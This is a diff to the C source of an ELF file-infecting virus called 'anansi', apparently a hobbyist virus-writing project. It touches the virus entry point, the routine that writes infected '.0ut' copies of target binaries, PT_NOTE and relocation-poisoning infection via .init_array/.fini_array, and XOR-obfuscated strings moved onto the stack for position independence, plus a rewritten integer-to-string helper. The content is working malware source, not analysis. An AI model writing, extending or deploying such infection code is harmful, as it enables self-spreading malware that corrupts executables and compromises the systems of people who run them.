@@ -30,6 +30,8 @@
 	#define ANANSI_INT 0xb
 	#define ANANSI_UNSIGNED_LONG 0xc
 	#define ANANSI_LONG 0xd
+
+	#define NUM_CONV_BUF_SIZE 70
 #endif
 
 #ifndef MAX_TARGET
@@ -38,7 +40,6 @@
 
 //misc macros
 #define RDRAND_BIT (1 << 30)
-#define SLASH_DEV_RANDOM ".edw.s`oenl"
 
 typedef struct elfbin {
 	Elf64_Ehdr *ehdr;
@@ -89,7 +90,8 @@ bool valid_target(Elfbin *c, int min_size, bool no_shared_objects);
 #ifdef DEBUG
 	int anansi_printf(char *format, ...);
 	char *itoa(void *data_num, int base, int var_type);
-	char *itoa_final(unsigned long n, int base);
+//	char *itoa_final(unsigned long n, int base);
+	char *itoa_final(long n, int base, char *output, size_t len);
 #endif
 
 /* vx-mechanics functions and global vars*/
@@ -183,8 +185,9 @@ void vx_main()
 
 	uint64_t vx_size = (uint8_t *)&end_vx - (uint8_t *)&real_start;
 
-	//subtract 5 to account call foobar instruction length
-	uint8_t *vx_start = (uint8_t *)get_eip() - ((uint8_t *)&foobar - (uint8_t *)&real_start)  - 5; //calculates the address of vx_main
+	uint8_t *vx_start = (uint8_t *)get_eip() - ((uint8_t *)&foobar - (uint8_t *)&real_start); //calculates the address of vx_main
+	char test_msg[] = "Infection Time";
+	anansi_write(1, test_msg, anansi_strlen(test_msg));
 
 #ifdef DEBUG
 	anansi_printf("vx_start @ 0x0%lx\n", vx_start);
@@ -252,6 +255,8 @@ int dispatch_infection(Elfbin *target)
 	Elf64_Ehdr *hdr;
 	uint8_t *insertion;
 
+	char filename_append[] = ".0ut";
+
 	bool use_reloc_poison;
 #ifdef DEBUG
 	anansi_printf("Viable target: %s\n", target->f_path);
@@ -280,7 +285,7 @@ int dispatch_infection(Elfbin *target)
 	char *v_name = anansi_malloc(f_path_len + 5);
 	int fd_out;
 	anansi_strncpy(v_name, target->f_path, f_path_len);
-	anansi_strncpy(v_name + f_path_len, ".0ut", 4);
+	anansi_strncpy(v_name + f_path_len, filename_append, 4);
 #ifdef DEBUG
 	anansi_printf("\t\t\tCreateding viral file %s\n", v_name);
 #endif
@@ -299,6 +304,7 @@ int dispatch_infection(Elfbin *target)
 	anansi_munmap(v_name, f_path_len + 5);
 	return 0;
 }
+
 
 void pt_note_infect(Elfbin *target)
 {
@@ -336,6 +342,9 @@ bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
 	Elf64_Addr rela_offset = 0;
 	Elf64_Xword rela_sz, rela_ent_size;
 
+	char init_array[] = ".init_array";
+	char fini_array[] = ".fini_array";
+
 	Elf64_Word rela_count = 0;
 	for(p_entry = 0; p_entry < target->ehdr->e_phnum; p_entry++) {
 		if(target->phdr[p_entry].p_type == PT_DYNAMIC) {
@@ -366,7 +375,7 @@ bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
 
 	rela_count = rela_sz / rela_ent_size;
 	reloc_entry = (Elf64_Rela*)(target->read_only_mem + rela_offset);
-	char *random_section = get_random_int() % 2 ? ".init_array" : ".fini_array";
+	char *random_section = get_random_int() % 2 ? init_array : fini_array;
 
 	for(int r = 0; r <= rela_count; r++) {
 		if(reloc_entry[r].r_info == R_X86_64_RELATIVE) {
@@ -420,7 +429,8 @@ bool check_cpu_for_rdrand()
 unsigned int get_random_int()
 {
 	char *dev_slash_random = NULL;
-	static bool cpu_supports_rdrand = false;
+	char encrypted_dev_slash_random[] = ".edw.s`oenl";
+	bool cpu_supports_rdrand = false;
 	unsigned int r_integer = 0;
 	uint8_t err;
 
@@ -428,11 +438,8 @@ unsigned int get_random_int()
 	int fd = -1;
 	size_t s_len;
 
-	if(!cpu_supports_rdrand)
-		if(check_cpu_for_rdrand())
-			cpu_supports_rdrand = true;
 
-	if(cpu_supports_rdrand) {
+	if((cpu_supports_rdrand = check_cpu_for_rdrand())) {
 		while(max_reads--) {
 			__asm__ __volatile__ (
 					"rdrand %%eax\n"
@@ -450,12 +457,12 @@ unsigned int get_random_int()
 	/* We've either exhausted max_reads or the cpu doesn't support rdrand, */
 	/* in either case we will use another src of entropy */
 	if(max_reads == 0 || !cpu_supports_rdrand) {
-		s_len = anansi_strlen(SLASH_DEV_RANDOM);
+		s_len = anansi_strlen(encrypted_dev_slash_random);
 		dev_slash_random = anansi_malloc(s_len); //TODO: failpoint
 		if(dev_slash_random == NULL)
 			goto clean_up;
 
-		decrypt_xor(SLASH_DEV_RANDOM, dev_slash_random);
+		decrypt_xor(encrypted_dev_slash_random, dev_slash_random);
 		fd = anansi_open(dev_slash_random, O_RDONLY, 0);
 		if(fd < 0)
 			goto clean_up;
@@ -466,7 +473,7 @@ unsigned int get_random_int()
 
 	clean_up:
 	if(dev_slash_random != NULL)
-		anansi_munmap(SLASH_DEV_RANDOM, s_len);
+		anansi_munmap(encrypted_dev_slash_random, s_len);
 	if(fd > 0)
 		anansi_close(fd);
 
@@ -509,7 +516,7 @@ int process_elf(Elfbin *target, int attr, int perm, int len)
 	void *mem = NULL;
 	struct stat fs;
 	char *p = target->f_path;
-
+	char ELFMAGIC[] = {0x7f, 'E', 'L', 'F'};
 	Elf64_Ehdr *ehdr;
 	Elf64_Phdr *phdr;
 	Elf64_Shdr *shdr;
@@ -529,7 +536,7 @@ int process_elf(Elfbin *target, int attr, int perm, int len)
 	if((mem = anansi_mmap(0, fs.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
 		return -1;
 
-	if(anansi_strncmp(mem, ELFMAG, anansi_strlen(ELFMAG)) < 0)
+	if(anansi_strncmp(mem, ELFMAGIC, 4) < 0)
 		return -1;
 
 	ehdr = (Elf64_Ehdr *)mem;
@@ -742,6 +749,7 @@ keep_parsing:
 				*(long *)var_ptr = va_arg(arg, long);
 				str_integer =  itoa(var_ptr, base, var_type);
 				count += anansi_write(STDOUT, str_integer, anansi_strlen(str_integer));
+				anansi_munmap(str_integer, anansi_strlen((str_integer)));
 				break;
 			}
 
@@ -767,6 +775,7 @@ keep_parsing:
 
 			str_integer = itoa(var_ptr, (base == 0 ? 10 : base), var_type);
 			count += anansi_write(STDOUT, str_integer, anansi_strlen(str_integer));
+			anansi_munmap(str_integer, anansi_strlen((str_integer)));
 			var_ptr = NULL;
 			base = 0;
 			break;
@@ -784,6 +793,7 @@ keep_parsing:
 
 			str_integer = itoa(var_ptr, 16, var_type);
 			count += anansi_write(STDOUT, str_integer, anansi_strlen(str_integer));
+			anansi_munmap(str_integer, anansi_strlen((str_integer)));
 			var_ptr = NULL;
 			break;
 
@@ -793,6 +803,7 @@ keep_parsing:
 			var_type =  ANANSI_INT;
 			str_integer = itoa(var_ptr,(base == 0 ? 10 : base), var_type);
 			count += anansi_write(STDOUT, str_integer, anansi_strlen(str_integer));
+			anansi_munmap(str_integer, anansi_strlen((str_integer)));
 			var_ptr = NULL;
 			base = 0;
 			break;
@@ -808,16 +819,20 @@ keep_parsing:
 }
 
 char *itoa(void *data_num, int base, int var_type) {
-	if(var_type == ANANSI_UNSIGNED_INT)
-		return itoa_final(*(unsigned int *)data_num, base);
-	if(var_type == ANANSI_INT)
-		return itoa_final(*(int *)data_num, base);
-	if(var_type == ANANSI_UNSIGNED_LONG)
-		return itoa_final(*(unsigned long *)data_num, base);
-	else
-		return itoa_final(*(long *)data_num, base);
-}
+	char *output = (char *)anansi_malloc(NUM_CONV_BUF_SIZE);
 
+	anansi_memset(output, 0, NUM_CONV_BUF_SIZE);
+
+	if(var_type == ANANSI_UNSIGNED_INT)
+		return itoa_final(*(unsigned int *)data_num, base, output, NUM_CONV_BUF_SIZE);
+	if(var_type == ANANSI_INT)
+		return itoa_final(*(int *)data_num, base, output, NUM_CONV_BUF_SIZE);
+	if(var_type == ANANSI_UNSIGNED_LONG)
+		return itoa_final(*(unsigned long *)data_num, base, output, NUM_CONV_BUF_SIZE);
+	else
+		return itoa_final(*(long *)data_num, base, output, NUM_CONV_BUF_SIZE);
+}
+/*
 char *itoa_final(unsigned long n, int base)
 {
 	char *conv = "0123456789abcdef";
@@ -858,6 +873,49 @@ char *itoa_final(unsigned long n, int base)
 		return itoa_final(n / base, base);
 	}
 }
+ */
+
+char *itoa_final(long n, int base, char *output, size_t len) {
+	char buf[NUM_CONV_BUF_SIZE];
+	char conv[] = "0123456789abcdef";
+	char hex_symbol[] = "0x";
+	bool neg = false;
+	int index = 0;
+	char *ptr;
+
+	if (n < 0) {
+		neg = true;
+		n = -(n);
+	}
+
+	while(n >= base) {
+		buf[index++] = conv[n % base];
+		n = n / base;
+	}
+
+	buf[index++] = conv[n % base];
+	buf[index] = '\0';
+
+	ptr = output;
+	if(neg)
+		*(ptr++) = '-';
+
+	if(base == 16) {
+		anansi_strncpy(ptr, hex_symbol, 2);
+		ptr += 2;
+	}
+
+	if(base == 8)
+		*(ptr++) = 'o';
+
+	for(int i = index - 1; i >= 0 && ptr < (output + NUM_CONV_BUF_SIZE - 1); i--, ptr++) {
+		*ptr = buf[i];
+	}
+
+	*ptr = '\0';
+	return output;
+}
+
 #endif
 
 void *anansi_memset(void *s, int c, size_t n)
